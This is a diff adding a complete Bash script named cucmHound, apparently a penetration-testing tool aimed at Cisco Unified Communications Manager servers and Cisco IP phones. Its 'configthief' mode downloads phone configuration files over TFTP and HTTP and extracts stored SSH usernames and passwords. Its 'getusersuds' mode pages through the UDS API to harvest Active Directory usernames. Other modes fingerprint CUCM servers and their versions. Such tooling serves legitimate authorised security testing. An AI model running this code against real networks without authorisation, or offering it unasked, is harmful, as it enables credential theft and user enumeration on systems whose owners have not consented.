@@ -1,0 +1,723 @@
+#!/bin/bash
+# shellcheck disable=2317
+# Author: Aaron Lesmeister
+# Date: 2022-09-08
+# File: cucmHound
+# Purpose: A tool for testing CUCM servers for common misconfigurations.
+#
+
+
+########################################
+# Globals
+VERSION="1.0.0"
+
+E="$(tput setaf 7)[$(tput setaf 9)!$(tput setaf 7)]$(tput sgr0)"
+P="$(tput setaf 7)[$(tput setaf 10)+$(tput setaf 7)]$(tput sgr0)"
+W="$(tput setaf 7)[$(tput setaf 11)?$(tput setaf 7)]$(tput sgr0)"
+I="$(tput setaf 7)[$(tput setaf 12)*$(tput setaf 7)]$(tput sgr0)"
+COLOR_BANNER="$(tput setaf 9)$(tput bold)"
+COLOR_RESET="$(tput sgr0)"
+CWD="$(pwd)"
+E_HOUND="🦮"
+E_PHONE="☎"
+E_SPY="🧐"
+E_DETECTIVE="🕵"
+E_XFACE="😵"
+NOW=$(date +"%m-%d-%Y %H%M")
+LOOTDIR="cisco_cucm"
+REGEX_IP="[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
+REGEX_HOST="(([a-zA-Z]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])"
+
+trap KILL_IT_WITH_FIRE SIGHUP SIGINT SIGTERM
+
+########################################
+# Functions
+KILL_IT_WITH_FIRE ()
+{
+    printf "%s Caught ctrl+c; Removing temp files and exiting.\n" "$W"
+    rm -rf tmptgts 2>/dev/null
+    exit 1
+}
+
+BANNER()
+{
+	printf '%s%s%s\n' "$COLOR_BANNER" "$(cat << 'EOF'
+                            _   _                       _ 
+                           | | | |                     | |
+   ___ _   _  ___ _ __ ___ | |_| | ___  _   _ _ __   __| |
+  / __| | | |/ __| '_ ` _ \|  _  |/ _ \| | | | '_ \ / _` |
+ | (__| |_| | (__| | | | | | | | | (_) | |_| | | | | (_| |
+  \___|\__,_|\___|_| |_| |_\_| |_/\___/ \__,_|_| |_|\__,_|
+                                                         
+                                   github.com/kopfjager007
+EOF
+	)" "$COLOR_RESET"
+
+}
+
+HELP()
+{
+    BANNER
+    printf "  Usage:\n"
+    printf "    -m      Mode\n" #configthief, getusersuds, findcucm,findphones,cucmversion
+    printf "              %s(Attack)%s\n" "$(tput bold)" "$(tput sgr0)"
+    printf "              configthief - Enumerates Cisco IP Phones and CUCM server, then pulls configs \n"
+    printf "                            and parses stored SSH credentials.\n"
+    printf "                             *Requires target CSV file as \"-i <FILE>.csv\".\n"
+    printf "              getusersuds - Enumerates AD users from the User Data Service API.\n"
+    printf "                             *Requires \"-c <CUCM_IP>\"\n\n"
+    printf "              %s(Recon/Probing)%s\n" "$(tput bold)" "$(tput sgr0)" 
+    printf "              findcucm    - Idenify CUCM servers. \n"
+    printf "                            Will also look for \"ConfigFileCacheList.txt\" on CUCM server.\n"
+    printf "                             *Requires target CSV file as \"-i <FILE>.csv\"\n"
+    printf "              cucmversion - Enumerates the CUCM version.\n"
+    printf "                             *Requires \"-c <CUCM_IP>\"\n"
+    printf "              cachelist   - Attempt to retrieve the ConfigFileCacheList.txt from a CUCM Server.\n"
+    printf "                             *Requires \"-c <CUCM_IP>\"\n"
+    printf "              \n"
+    printf "    -i      CSV Infile (see attack modes for needed file).\n"
+    printf "              \n"
+    printf "    -c      CUCM Server IP Address. \n"
+    printf "              \n"
+    printf "    -h      Print this help and exit. \n"
+    printf "              \n"
+    printf "  Examples: \n"
+    printf "    1. Run ConfigThief mode to find CUCM servers and Cisco Phones and pull down configs if found.\n"
+    printf "       $ cucmHound -m configthief -i int-targets.csv \n"
+    printf "              \n"
+    printf "    2. Enumerate AD users from CUCM UDS API. \n"
+    printf "       $ cucmHound -m getusersuds -c <CUCM_IP> \n"
+    printf "              \n"
+    printf "  Note: Targets file \"<FILE.csv>\" used with the \"-i\" flag can be obtained by parsing Nmap\n"
+    printf "        and should be in the following format, one target per line.\n"
+    printf " \n"
+    printf "        IP Address,Host Name,Operating System,Services\n"
+    printf "        10.10.10.10,Unknown,Unknown,TCP80; TCP443;\n\n"
+    exit 0
+}
+
+ENUM_CUCM_VER()
+{
+    # Mode: getversion
+
+    # Query CUCM for version.
+
+    # NOTES: This can be called as a standalone mode, but should also be called when running modes
+    # getusersuds, configthief, and findcucm.
+    local vfile
+    local cucmversion
+    vfile="$LOOTDIR/cucm-${cucmsvr}-version.xml"
+
+    # DEV
+    #printf "%s Mode 'getversion' not yet implemented.\n" "$E_SPY"
+    #exit 1
+
+    printf "%s Enumerating CUCM server version.\n" "$I"
+    curl -sk --max-time 5 https://$cucmsvr/cucm-uds/version -o "$vfile"
+
+    # Check if a file was written to disk
+    if [ -f "${vfile}" ]; then
+        # Check if the file is empty
+        if [ -z "${vfile}" ]; then
+            printf "%s File is empty.\n" "$E"
+        else
+            cucmversion="$(grep -aoE '<version>[0-9]{1,3}\.[0-9]{1,3}(\.[0-9]{1,3})?' $vfile | cut -d'>' -f2)"
+            printf "%s CUCM Version: %s\n" "$P" "$cucmversion"
+        fi
+    else
+        printf "%s Error. No response received from the server." "$E"
+    fi
+}
+
+CUCM_CONFIG_FILE()
+{
+    # Mode: configtheif
+    # ConfigFileCacheList.txt is hosted over TFTP
+
+    local cucmtgt
+    local outfile_cucmcfg
+    local check
+    local outdir
+    local cfgfiles
+
+    # Set target depending on where this function was called from.
+    if [ -n "$cucmsvr" ]; then
+        cucmtgt="$cucmsvr" # Called as a mode w/ "-c <CUCM_IP>"
+    else
+        cucmtgt="$cucm" # Called from FIND_CUCM
+    fi
+
+    outfile_cucmcfg="$cucmtgt""_ConfigFileCacheList.txt"
+    outfile_cucmcfg_parsed="$outfile_cucmcfg"".parsed"
+    outdir="cfcl-files"
+
+    #cd to loot dir
+    cd "$LOOTDIR"
+
+    printf "%s Checking for ConfigFileCacheList on CUCM TFTP server.\n" "$I"
+    (
+        echo "ascii"
+        echo "get ConfigFileCacheList.txt"
+        echo "quit"
+    ) | tftp "$cucmtgt" > /dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        mv ConfigFileCacheList.txt "$outfile_cucmcfg"
+        printf "%s ConfigFileCacheList.txt downloaded.\n" "$P"
+        printf "%s Parsing ConfigFileCacheList.txt.\n" "$I"
+        grep -E '\.(tlv|cnf|sgn|xml)' "$outfile_cucmcfg" | awk -F' ' '{print $1}' > "$outfile_cucmcfg_parsed"
+        if [ -s "$outfile_cucmcfg_parsed" ]; then
+            printf "%s ConfigFileCacheList.txt parsed. Downloading observed files...\n" "$P"
+            mkdir "$outdir"
+            cd "$outdir"
+            while IFS= read -r cfgfiles; do
+                (
+                    echo "ascii"
+                    echo "get $cfgfiles"
+                    echo "quit"
+                ) | tftp "$cucmtgt" > /dev/null 2>&1
+                if [ $? -eq 0 ]; then
+                    printf "%s Download file \"%s\" from %s.\n" "$P" "$cfgfiles" "$cucmtgt"
+                else
+                    printf "%s Download file \"%s\" from %s.\n" "$F" "$cfgfiles" "$cucmtgt"
+                fi
+            done < ../"$outfile_cucmcfg_parsed"
+            cd ../
+        else
+            printf "%s ConfigFileCacheList.txt found on %s but appears to be empty.\n" "$W" "$cucm"
+        fi
+    else
+        printf "%s ConfigFileCacheList.txt not found on %s.\n" "$I" "$cucm"
+    fi
+
+    # go back to CWD
+    cd "$CWD"
+
+}
+
+FIND_CUCM()
+{
+    # Mode: findcucm
+
+    # Identify CUCM server(s) on the network. This should take a CSV file, preferably int-targets.csv
+    # but it could take int-discovery.csv. 
+    
+    # NOTES: I don't plan to do CIDRs since at this point we've already performed discovery scanning 
+    # and have those results. This mode can be called stand alone or called if the -c $cucmsvr flag
+    # has been omitted.
+    #
+    # Login Page: https://$cucmsvr/ccmadmin/showHome.do
+
+    local protos
+    local uris
+    local outfile_cucm
+    local cucm
+    local numtgts
+    local cucmid
+    local pos
+
+    protos=("https")
+    uris=("ccmadmin/showHome.do")
+    outfile_cucm="$LOOTDIR/cucm.tgts"
+
+    # Make a directory for downloaded HTML
+    if [ ! -d $LOOTDIR/html ]; then
+        mkdir $LOOTDIR/html
+    fi
+
+    printf "%s Beginning Cisco UCM Server Enumeration at %s.\n" "$I" "$NOW"
+    grep -E 'TCP80;|TCP443;' "$infile" | cut -d, -f1 >> tmptgts
+    numtgts="$(wc -l tmptgts | cut -d' ' -f1)"
+    printf "%s Found (%s) potential targets.\n" "$I" "$numtgts"
+    
+    while read -r cucm; do
+        # HTTP targets
+        # Start by checking response code from target
+        printf "\n%s Checking if %s is a Cisco UCM Server.\n" "$I" "$cucm"
+
+        cucmid=0
+
+        for proto in "${protos[@]}"; do
+            pos=0 # element position
+            for uri in "${uris[@]}"; do
+                target_url="$proto://$cucm/$uri"
+                raw_html="cucmsvr_""$proto""_""$cucm""_""$pos"".html"
+                check=$(curl -skL --max-time 5 "$target_url" | grep -ciE 'Cisco Unified CM Console|Cisco Unified CM Administration|Cisco Unified OS Administration')
+                
+                if [ "$check" != 0 ]; then
+                    # Download the resource.
+                    curl -skL --max-time 5 "$target_url" -o $LOOTDIR/html/"${raw_html}"
+                    if [ $cucmid -eq 0 ]; then
+                        printf "%s Cisco UCM Server Identified on %s!\n" "$P" "$cucm"
+                        cucmid=1
+                        echo "$cucm" >> "$outfile_cucm"
+                        
+                        # If a server is identified, check for the ConfigFileCacheList.txt
+                        CUCM_CONFIG_FILE "$cucm"
+                    fi
+                fi
+                
+                # Iterate position var
+                ((pos++))
+
+                # throttle requests a bit
+                sleep 1
+            done
+        done
+    done < tmptgts
+    rm tmptgts
+
+    NOW=$(date +"%m-%d-%Y %H%M")
+    printf "\n%s Finished at %s.\n" "$I" "$NOW"
+
+
+    exit 1
+}
+
+GRAB_CONFIGS()
+{
+    # Mode: configthief
+    # needs outfile_phones from find_phones or supplied on cli
+
+    local phone
+    local cucm
+    local infile_type # Used when passing a phone.csv
+    local in_file # Used when passing a phone.csv
+    local outdir
+    local outconfig
+    local outcreds
+
+    in_file="$infile"
+    infile_type="$filetype"
+    phone="$hostname"
+    cucm="$target_svr"
+    outdir="$LOOTDIR/configs"
+    outconfig="$phone.cnf.xml"
+    outcreds="$hostname.creds"
+
+    if [ ! -d "$outdir" ]; then
+        mkdir "$outdir"
+    fi
+
+    # Pull down the config    
+    printf "%s Attempting to retrieve phone config for %s from CUCM %s\n" "$I" "$phone" "$cucm"
+    curl -s --max-time 5 http://"$cucm":6970/"$phone".cnf.xml.sgn -o "$outdir/$outconfig"
+    if [ -f "$outdir/$phone.cnf.xml" ]; then
+        printf "%s %s's phone config retrieved!\n" "$P" "$phone"
+        printf "%s Parsing config for credentials...\n" "$I"
+        if [ $(grep -caE '(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>)' "$outdir/$outconfig") -ne 0 ]; then
+            printf "%s Printing SSH Creds to file\n" "$P"
+            grep -aE '(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>)' "$outdir/$outconfig" >> "$outdir/$outcreds"
+        else
+            printf "%s No credentials found in %s.\n" "$I" "$outdir/$outcreds"
+        fi
+    else
+        printf "%s Error! Problem saving phone config.\n" "$F"
+    fi
+}
+
+FIND_PHONES()
+{
+    # Mode: findphones
+
+    # Function to enumerate Cisco IP phones and output to a csv file for grab_configs
+
+    local numtgts
+    local target
+    local proto
+    local uri
+    local target_url
+    local check
+    local hostname
+    local protos
+    local uris
+    local attack
+    local skip # var to break on proto loop and avoid duplicates
+    local phid # Just print if a phone is identified once per phone
+    local target_svr
+    outfile_phones="cisco-phones.csv"
+
+    protos=("http" "https")
+    uris=("CGI/Java/Serviceability?adapter=device.statistics.device" "CGI/Java/Serviceability?adapter=device.statistics.configuration" "StreamingStatistics" "NetworkConfiguration" "")
+
+    # Make a directory for downloaded HTML
+    if [ ! -d $LOOTDIR/html ]; then
+        mkdir $LOOTDIR/html
+    fi
+
+    printf "%s Beginning Cisco IP Phone Enumeration at %s.\n" "$I" "$NOW"
+    grep -E 'TCP80;|TCP443;' "$infile" | cut -d, -f1 >> tmptgts
+    numtgts="$(wc -l tmptgts | cut -d' ' -f1)"
+    printf "%s Found (%s) potential targets.\n" "$I" "$numtgts"
+    
+    while read -r target; do
+        # HTTP targets
+        # Start by checking response code from target
+        printf "\n%s Checking if %s is a Cisco IP Phone.\n" "$I" "$target"
+
+        skip=0
+        phid=0
+
+        for proto in "${protos[@]}"; do
+            pos=0 # element position
+            for uri in "${uris[@]}"; do
+                target_url="$proto://$target/$uri"
+                raw_html="$proto""_""$target""_""$pos"".html"
+                check=$(curl -skL --max-time 5 "$target_url" | grep -ciE 'Cisco *(Unified)? *IP Phone')
+
+                #printf "[DEBUG]> %s => \$check=%s\n" "$target_url" "$check" #### DEBUG
+                
+                if [ "$check" != 0 ]; then
+                    # Download the resource.
+                    curl -skL --max-time 5 "$target_url" -o $LOOTDIR/html/"${raw_html}"
+                    if [ $phid -eq 0 ]; then
+                        printf "%s Cisco IP Phone Identified on %s (%s) \n" "$P" "$target" "$hostname"
+                        phid=1
+                    fi
+
+                    # Get the hostname
+                    #hostname=$(curl -skL --max-time 5 "$target_url" | grep -oE '(CIP|SEP)[0-9A-F]{12}' | uniq)
+                    hostname=$(grep -oE '(CIP|SEP)[0-9A-F]{12}' $LOOTDIR/html/"${raw_html}" | uniq)
+                    if [ -n "$hostname" ]; then
+                        printf "%s Reviewing \"%s\" for CUCM or TFTP servers...\n" "$I" "$uri"
+                        #printf "%s Cisco IP Phone Identified on %s (%s) \n" "$P" "$target" "$hostname"
+
+                        # Get Active CUCM server and TFTP server from HTML
+                        # NOTES: It's gonna be janky AF because Cisco's HTML is poo.
+                        # I've seen CUCMs identified as the following (we'll only go after active/primary):
+                        #  (grep -i -a3 <search>)
+                        #   - "Unified CM 1"
+                        #   - "CUCM server1"
+                        # Additionally, phones usually list the CUCM by IP in the TFTP server. This doesn't always match up with the CUCM server noted.
+                        #   - "b> TFTP server 1"
+                        active_cucm=$(grep -v "</FONT></FONT>" $LOOTDIR/html/"${raw_html}" | xmllint --recover --nowarning --html - | grep -a3 -iE "Unified CM 1|CUCM server1"  | grep -aE '<td><b>(\S+)(\s+)?Active' | sed -E 's/<(\/)?td>|<(\/)?b>//g'|cut -d' ' -f1)
+
+                        # In order to get the configs, we need a CUCM.
+                        if [[ "$active_cucm" =~ $REGEX_HOST ]]||[[ "$active_cucm" =~ $REGEX_IP ]]; then
+                            # We got a CUCM, record the data and stop iterating over URIs
+                            # IP Address,Host Name,Proto,URI,CUCM
+                            printf "%s CUCM Server Identified for %s.\n" "$P" "$hostname"
+                            echo "$target,$hostname,$proto,$target_url,CUCM:$active_cucm" >> $LOOTDIR/$outfile_phones
+                            skip=1
+
+                            target_svr="$active_cucm"
+                            GRAB_CONFIGS "$hostname" "$target_svr"
+
+                            break
+                        else
+                            printf "%s No CUCM Server Identified for %s.\n" "$W" "$hostname" 
+                            active_tftp=$(grep -v "</FONT></FONT>" $LOOTDIR/html/"${raw_html}" | xmllint --recover --nowarning --html - | grep -a3 -iE "b> TFTP server 1" | grep -oE "$REGEX_IP")
+                            # If we didn't get a hit on "Unified CM or CUCM server, move on to the TFTP server which is almost always a CUCM."
+                            if [ -n "$active_tftp" ]; then
+                                # We got a TFTP server which is likely a CUCM. Record the data and stop iterating over URIs.
+                                # IP Address,Host Name,Proto,URI,TFTP
+                                printf "%s TFTP Server Identified for %s.\n" "$P" "$hostname"
+                                echo "$target,$hostname,$proto,$target_url,TFTP:$active_tftp" >> $LOOTDIR/$outfile_phones
+                                skip=1
+
+                                target_svr="$active_tftp"
+                                GRAB_CONFIGS "$hostname" "$target_svr"
+
+                                break
+                            else
+                                printf "%s No TFTP Server Identified for %s.\n" "$W" "$hostname"
+                            fi
+                        fi
+                    else
+                        printf "%s Cisco IP Phone Identified but unable to find Host Name (URL: %s)\n" "$W" "$target_url"
+                    fi
+                fi
+                
+                # Iterate position var
+                ((pos++))
+
+                # throttle requests a bit
+                sleep 1
+            done
+            if [ $skip -eq 1 ]; then
+                    break
+            fi
+        done
+    done < tmptgts
+    rm tmptgts
+
+    NOW=$(date +"%m-%d-%Y %H%M")
+    printf "\n%s Finished at %s.\n" "$I" "$NOW"
+
+    # If this function is being called from mode "ConfigThief", continue on. Otherwise we're done doing phone recon.
+    if [ -f "$LOOTDIR/$outfile_phones" ]; then
+        printf "%s Cisco IP Phones saved to \"%s\".\n" "$P" "$outfile_phones"
+        printf "%s Done!\n" "$I"
+    else
+        printf "%s No Cisco Phones were identified.\n" "$W"
+    fi
+}
+
+PARSE_USERS()
+{
+    # Mode: getusersuds
+
+    userlist="$cucmsvr-userlist"
+    if which xmllint >/dev/null ; then
+        printf "%s Parsing users from output files.\n" "$I"
+        grep -ahE '<userName>(\S+)</userName>' "$outdir/$cucmsvr"-users_p*.xml | sed -e 's/<\/\?userName>//g' -e 's/^\ \+\ //g' | tr '[:upper:]' '[:lower:]' | sort -u -o "$outdir/$userlist"
+        printf "%s Output files parsed. Userlist saved to %s\n" "$P" "$userlist"
+        exit 0
+    else
+        printf "%s xmllint was not found; unable to parse files.\n" "$W"
+        printf "%s Run \"sudo apt install libxml2-dev\" to install.\n" "$W"
+        exit 0
+    fi
+}
+
+GET_USERS()
+{
+    # Mode: getusersuds
+
+    # Query UDS Users API and iterate 'start=' param to obtain all users.
+    # By default, returned user count is limited to 64 entries. While this can be set higher by 
+    #  cucm admins, it typically isn't.
+
+    # function variables
+    local totalcount
+    local START 
+    local ITER
+    local GOTEM
+    local tmpfile
+    local parsed
+    local outdir
+
+    # Set
+    totalcount=$TOTAL_COUNT
+    outdir="$LOOTDIR/userenum"
+    START=0
+    ITER=64
+    GOTEM=0
+
+    if [ ! -d "$outdir" ]; then
+        mkdir "$outdir"
+    fi
+    
+    printf "%s Getting Users...\n" "$P"
+
+    while [ "$START" -le "$totalcount" ]; do
+        tmpfile="$cucmsvr-users_p$START.out"
+        parsed="$cucmsvr-users_p$START.xml"
+        printf "%s Getting users %s to %s\n" "$P" "$START" "$(($START + $ITER))"
+        curl -sk --max-time 5 https://$cucmsvr/cucm-uds/users?start=$START -o "$outdir/$tmpfile"
+        if [ -s "$outdir/$tmpfile" ]; then
+            if which xmllint >/dev/null; then
+                xmllint --format "$outdir/$tmpfile" --output "$outdir/$parsed"
+                rm "$outdir/$tmpfile"
+            fi
+            GOTEM=$(($GOTEM + 1))
+        else
+            printf "%s Failed to download data (empty file).\n" "$E"
+        fi
+        START=$(($START + $ITER))
+    done
+    
+    if [ "$GOTEM" -gt 0 ]; then
+        PARSE_USERS "$outdir"
+    else
+        printf "%s No vaible output files to parse.\n" "$W"
+        exit 0
+    fi
+}
+
+PROBE()
+{
+    # Mode: getusersuds
+
+    # Query the UDS Users API and get the value of 'totalCount', which is the number of users in the system.
+    printf "%s Querying UDS \"Users\" API on %s for total accounts.\n" "$I" "$cucmsvr"
+    TOTAL_COUNT="$(curl -sk --max-time 5 https://$cucmsvr/cucm-uds/users | grep -oE 'totalCount="[0-9]{1,6}"' | cut -d\" -f2)"
+    if [ -n "$TOTAL_COUNT" ]; then
+        printf "%s Total User Count is: %s\n" "$I" "$TOTAL_COUNT"
+        # Send total user count to get_users() func.
+        return "$TOTAL_COUNT"
+    else
+        printf "%s Nothing was returned from the UDS \"Users\" API on %s.\n" "$E" "$cucmsvr"
+        exit 0
+    fi
+}
+
+MODE()
+{
+    BANNER
+    printf "\n"
+
+    # Vars in: runopt, infile, cucmsvr
+    runmode=$(echo "$runopt"|tr '[:upper:]' '[:lower:]')
+    filetype="" 
+
+    # Create a loot dir for all of the possible output files.
+    if [ ! -d $LOOTDIR ]; then
+        mkdir $LOOTDIR
+    fi
+    
+    # Determine the mode requested.
+    if [ -z "$runmode" ]; then
+        printf "%s Error! You did not specify a mode with \"-m\".\n" "$W"
+    else
+        case $runmode in
+
+            configthief)
+                # Check for required csv file
+                if [ -n "${infile}" ]; then
+                    if [ -f "$infile" ]; then
+                        
+                        # Determine file provided; either nmap-scanner output
+                        if [ "$(head -n1 $infile | grep -c 'IP Address,Host Name,')" -eq 1 ]; then
+                            # If that header line exists in the file, it's (likely) an nmap-scanner output CSV file.
+                            filetype="nmap"
+                        else
+                            filetype="unk"
+                        fi
+                        
+                        # If the infile file type is nmap, we'll do a full scan for cisco phones.
+                        if [ $filetype == "nmap" ]; then
+                            FIND_PHONES "$infile"
+
+                        else
+                            printf "%s Error! The supplied file doesn't look like an nmap-scanner CSV file.\n" "$F"
+                            exit 1
+                        fi
+                    else
+                        printf "%s Error! Supplied file does not exist.\n" "$W"
+                    fi
+                else
+                    printf "%s Error! ConfigThief mode requires \"-i\" with a valid CSV file.\n" "$W"
+                fi
+                ;;
+            
+            getusersuds)
+                printf "%s GetUsersUDS mode started!\n" "$I"
+                if [ -n "$cucmsvr" ]; then
+                    PROBE
+                    GET_USERS "$TOTAL_COUNT"
+                else
+                    printf "%s Error! You must supply the IP address of the CUCM server.\n" "$W"
+                    exit 1
+                fi
+                ;;
+            
+            findcucm)
+                printf "%s FindCUCM mode started!\n" "$I"
+                # Check for required csv file
+                if [ -n "${infile}" ]; then
+                    if [ -f "$infile" ]; then
+                        
+                        # Determine file provided; either nmap-scanner output
+                        if [ "$(head -n1 $infile | grep -c 'IP Address,Host Name,')" -eq 1 ]; then
+                            # If that header line exists in the file, it's (likely) an nmap-scanner output CSV file.
+                            filetype="nmap"
+                        else
+                            filetype="unk"
+                        fi
+                        
+                        # If the infile file type is nmap, we'll do a full scan for cisco phones.
+                        if [ $filetype == "nmap" ]; then
+                            printf "%s FindCUCM mode started!\n" "$I"
+                            FIND_CUCM "$infile"
+
+                        else
+                            printf "%s Error! The supplied file doesn't look like an nmap-scanner CSV file.\n" "$F"
+                            exit 1
+                        fi
+                    else
+                        printf "%s Error! Supplied file does not exist.\n" "$W"
+                    fi
+                else
+                    printf "%s Error! FindCUCM mode requires \"-i\" with a valid CSV file.\n" "$W"
+                fi
+                ;;
+        
+            cucmversion)
+                printf "%s CUCM Version Enumeration mode started!\n" "$I"
+                if [ -n "$cucmsvr" ]; then
+                    ENUM_CUCM_VER "$cucmsvr"
+                else
+                    printf "%s Error! You must supply the IP address of the CUCM server.\n" "$W"
+                    exit 1
+                fi
+                ;;
+            
+            cachelist)
+                printf "%s Enumerate ConfigFileCacheList mode started!\n" "$I"
+                if [ -n "$cucmsvr" ]; then
+                    CUCM_CONFIG_FILE "$cucmsvr"
+                else
+                    printf "%s Error! You must supply the IP address of the CUCM server.\n" "$W"
+                    exit 1
+                fi
+                ;;
+            
+            *)
+                printf "%s Unrecognized mode specified!\n" "$W"
+                exit 1
+                ;;
+            
+        esac
+    fi
+
+    # Preliminary checks
+    #printf "%s Not Yet Implemented.\n" "$E_SPY"
+    exit 1
+}
+
+foo()
+{
+    printf "%s Foo got %s\n" "$P" "$narf"
+    exit 0
+}
+
+testfunc()
+{
+    printf "%s Test Func says %s!\n" "$P" "$myarg"
+    narf="$myarg"
+    foo "$narf"
+    exit 0
+}
+
+########################################
+# Main
+if [ $# -lt 1 ]; then
+    HELP
+fi
+
+while getopts m:i:c:vh flag; do
+    case "${flag}" in
+        m) 
+            # Mode (required)
+            runopt=${OPTARG}
+            ;;
+        i)
+            # CSV input file
+            infile="${OPTARG}"
+            ;;
+        c)
+            # CUCM Server IP
+            cucmsvr=${OPTARG}
+            ;;
+        h)
+            HELP
+            exit 0
+            ;;
+        v)
+            printf "Version %s\n" "$VERSION"
+            exit 0
+            ;;
+        :)
+            HELP
+            printf "%s Missing argument for %s\n" "$E_XFACE" "$OPTARG"
+            exit 1
+            ;;
+        *)
+            HELP
+            printf "%s Unrecognized flag provided: %s\n" "$E_XFACE" "$OPTARG"
+            exit 1
+            ;;
+    esac
+done 
+
+MODE "$runopt" "$infile" "$cucmsvr"
